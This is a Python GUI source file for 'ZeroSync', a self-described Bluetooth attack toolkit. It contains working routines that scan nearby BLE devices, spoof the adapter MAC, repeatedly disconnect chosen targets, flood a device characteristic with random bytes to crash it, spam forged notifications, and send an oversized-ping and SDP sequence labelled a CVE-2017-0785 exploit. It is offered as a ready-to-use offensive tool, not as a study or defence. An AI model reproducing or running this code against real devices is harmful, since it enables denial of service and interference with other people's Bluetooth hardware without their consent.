#!/usr/bin/env python3
"""
ZeroSync GUI – Cyberpunk Edition
Author: Null_Lyfe
"""

import tkinter as tk
from tkinter import scrolledtext
from tkinter import messagebox
from threading import Thread
from datetime import datetime
import subprocess
import os
import sys
import time
import random
from bluepy.btle import Scanner, Peripheral, DefaultDelegate, BTLEException, ADDR_TYPE_PUBLIC, ADDR_TYPE_RANDOM

# === Core BLE Logic ===

seen_devices = {}

class BLEHandler(DefaultDelegate):
    def __init__(self): super().__init__()
    def handleNotification(self, cHandle, data): log(f"[📥 Notification] {data}")

def log(msg):
    timestamp = datetime.now().strftime("%H:%M:%S")
    terminal.configure(state='normal')
    terminal.insert(tk.END, f"[{timestamp}] {msg}\n")
    terminal.see(tk.END)
    terminal.configure(state='disabled')

def scan_devices():
    log("🔎 Scanning for BLE devices...")
    scanner = Scanner()
    try:
        devices = scanner.scan(10.0)
        for idx, d in enumerate(devices):
            mac = d.addr
            rssi = d.rssi
            if mac not in seen_devices:
                seen_devices[mac] = {"first_seen": datetime.now().strftime("%H:%M:%S"), "max_rssi": rssi}
            else:
                seen_devices[mac]["max_rssi"] = max(seen_devices[mac]["max_rssi"], rssi)
            log(f"{idx}: {mac} RSSI={rssi} dB")
    except BTLEException as e:
        log(f"[❌ Scan error] {e}")

def spoof_mac():
    new_mac = "00:11:22:33:44:55"  # Change this for custom entry
    os.system("sudo ifconfig hci0 down")
    os.system(f"sudo bdaddr -i hci0 {new_mac}")
    os.system("sudo ifconfig hci0 up")
    log("✅ MAC spoofed to " + new_mac)

def broadcast_aliases():
    names = ["ZeroSync_X", "NSA_Van", "💀 Null_Lyfe 💀", "Free_Wifi", "BLE_BOMB"]
    try:
        while True:
            for n in names:
                subprocess.run(["bluetoothctl", "system-alias", n], stdout=subprocess.DEVNULL)
                log(f"📡 Broadcasting as {n}")
                time.sleep(1.2)
    except KeyboardInterrupt:
        subprocess.run(["bluetoothctl", "system-alias", "ZeroSync"], stdout=subprocess.DEVNULL)
        log("🛑 Advertising stopped.")

def crash_ble():
    scan_devices()
    try:
        idx = int(prompt_popup("Enter index to crash:"))
        addr = list(seen_devices.keys())[idx]
        p = Peripheral(addr, ADDR_TYPE_PUBLIC)
        for _ in range(20):
            p.writeCharacteristic(0x000b, os.urandom(30), withResponse=False)
            log(f"💣 Crashed {addr}")
            time.sleep(0.2)
    except Exception as e:
        log(f"[⚠️ Crash error] {e}")

def ble_deauth():
    scan_devices()
    try:
        idx = int(prompt_popup("Index to deauth:"))
        addr = list(seen_devices.keys())[idx]
        for i in range(10):
            subprocess.run(["hcitool", "dc", addr], stdout=subprocess.DEVNULL)
            log(f"✂️ Deauth sent to {addr} ({i+1})")
            time.sleep(0.3)
    except Exception as e:
        log(f"[❌ Deauth error] {e}")

def replay_notify():
    scan_devices()
    try:
        idx = int(prompt_popup("Index for replay spam:"))
        msg = prompt_popup("Enter message:").encode()
        addr = list(seen_devices.keys())[idx]
        p = Peripheral(addr, ADDR_TYPE_RANDOM)
        p.setDelegate(BLEHandler())
        for _ in range(10):
            p.writeCharacteristic(0x0001, msg)
            log(f"💌 Sent {msg.decode(errors='ignore')} to {addr}")
            time.sleep(0.5)
    except Exception as e:
        log(f"[⚠️ Replay error] {e}")

def cve_exploit():
    scan_devices()
    try:
        idx = int(prompt_popup("CVE index:"))
        addr = list(seen_devices.keys())[idx]
        log(f"Launching CVE-2017-0785 on {addr}")
        subprocess.run(["l2ping", "-c", "3", "-s", "800", addr], stdout=subprocess.DEVNULL)
        subprocess.run(["sdptool", "browse", addr], stdout=subprocess.DEVNULL)
        subprocess.run(["l2ping", "-c", "5", "-s", "2048", addr], stdout=subprocess.DEVNULL)
        log("✅ CVE sequence dispatched.")
    except Exception as e:
        log(f"[❌ CVE error] {e}")

def export_logs():
    os.makedirs("zerosync_logs", exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = f"zerosync_logs/session_{ts}.log"
    with open(path, "w") as f:
        for mac, meta in seen_devices.items():
            f.write(f"{mac} | First Seen: {meta['first_seen']} | Max RSSI: {meta['max_rssi']}\n")
    log(f"📁 Logs saved to {path}")

def launch_zerojam():
    try:
        subprocess.Popen(["python3", "zerojam_mesh.py"])
        log("🌐 ZeroJam mesh launched.")
    except Exception as e:
        log(f"[❌ Mesh launch failed] {e}")

def prompt_popup(msg):
    popup = tk.Toplevel(root)
    popup.title("Input Required")
    popup.geometry("300x100")
    label = tk.Label(popup, text=msg)
    label.pack()
    entry = tk.Entry(popup)
    entry.pack()
    result = []

    def close():
        result.append(entry.get())
        popup.destroy()

    btn = tk.Button(popup, text="Submit", command=close)
    btn.pack()
    popup.wait_window()
    return result[0] if result else ""

# === GUI Setup ===

root = tk.Tk()
root.title("ZeroSync v7.9 – Null_Lyfe")
root.geometry("1000x600")
root.configure(bg="#0f0f0f")

title = tk.Label(root, text="ZeroSync – Bluetooth Attack Toolkit", font=("OCR A Extended", 20), fg="#39ff14", bg="#0f0f0f")
title.pack(pady=10)

btn_frame = tk.Frame(root, bg="#0f0f0f")
btn_frame.pack()

def make_button(txt, cmd):
    return tk.Button(btn_frame, text=txt, width=25, height=2, fg="#0f0", bg="#1a1a1a",
                     activebackground="#222", activeforeground="#39ff14", command=lambda: Thread(target=cmd).start())

# === Buttons ===
buttons = [
    ("🔍 Scan BLE Devices", scan_devices),
    ("✂️ Deauth BLE Device", ble_deauth),
    ("🎭 Spoof MAC", spoof_mac),
    ("💬 Replay Notification", replay_notify),
    ("💣 Crash BLE Device", crash_ble),
    ("🧠 CVE-2017-0785 Exploit", cve_exploit),
    ("🌐 Launch ZeroJam Mesh", launch_zerojam),
    ("📁 Export Scan Logs", export_logs)
]

for idx, (label, func) in enumerate(buttons):
    btn = make_button(label, func)
    btn.grid(row=idx//2, column=idx%2, padx=10, pady=5)

# === Terminal ===
terminal = scrolledtext.ScrolledText(root, state='disabled', bg="black", fg="#39ff14", insertbackground="#39ff14", font=("Courier", 10))
terminal.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

root.mainloop()
